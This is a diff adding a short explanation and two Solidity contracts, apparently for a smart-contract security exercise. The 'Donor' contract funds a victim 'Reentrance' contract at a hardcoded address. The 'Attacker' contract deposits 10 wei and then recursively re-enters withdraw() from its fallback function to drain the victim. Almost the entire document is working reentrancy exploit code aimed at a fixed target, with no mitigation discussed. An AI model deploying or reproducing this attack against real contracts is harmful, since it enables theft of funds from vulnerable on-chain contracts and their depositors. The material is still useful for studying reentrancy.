@@ -1,0 +1,49 @@
+Our donor contract mimics someone who has contributed some money into the Reentrance contract. Thereafter, our Attacker contract steals all the money by first making a small donation and then performs a reentrancy attack by recursively calling the withdraw() function.
+
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.10;
+contract Donor
+{
+    address victimContract = 0xD4Fc541236927E2EAf8F27606bD7309C1Fc2cbee;
+
+    constructor() payable{}
+    
+    function donate(uint amt) public
+    {
+        victimContract.call{value: amt * 1 wei} (abi.encodeWithSignature("donate(address)", uint256(uint160(address(this)))));
+    }
+
+    function tellBalance() public view returns (uint)
+    {
+        return address(this).balance;
+    }
+}
+
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.10;
+contract Attacker
+{
+    address victimContract = 0xD4Fc541236927E2EAf8F27606bD7309C1Fc2cbee;
+
+    constructor() payable{}
+    
+    function attack() public
+    {
+        // First, make a small deposit of 10 wei
+        victimContract.call{value: 10 wei} (abi.encodeWithSignature("donate(address)", uint256(uint160(address(this)))));
+
+        // Second, Make the first withdrawal
+        victimContract.call(abi.encodeWithSignature("withdraw(uint256)", 10));
+    }
+
+    fallback() payable external
+    {
+        // Third, Recursively call the withdraw()
+        victimContract.call(abi.encodeWithSignature("withdraw(uint256)", 10));
+    }
+
+    function tellBalance() public view returns (uint)
+    {
+        return address(this).balance;
+    }
+}
